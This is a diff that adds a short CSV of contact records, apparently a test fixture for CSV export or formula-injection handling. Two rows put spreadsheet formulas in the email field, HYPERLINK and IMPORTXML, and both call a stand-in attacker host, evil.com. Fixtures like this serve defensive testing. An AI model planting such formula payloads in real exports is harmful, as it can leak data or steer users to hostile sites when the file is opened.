@@ -1,0 +1,7 @@
+email,phone,first_name,last_name,dob
+alice@example.com,555-0101,Alice,Johnson,1985-03-15
+bob@example.com,555-0102,Bob,Smith,1990-07-22
++HYPERLINK("http://evil.com"),555-0103,Adam,Cook,1990-09-17
+carol@example.com,555-0104,Carol,Williams,1978-11-30
+=IMPORTXML("http://evil.com","//secret"),(555)101-2071,Vince,Price,1994-03-30
+dave@example.com,555-0105,Dave,Brown,1992-01-08
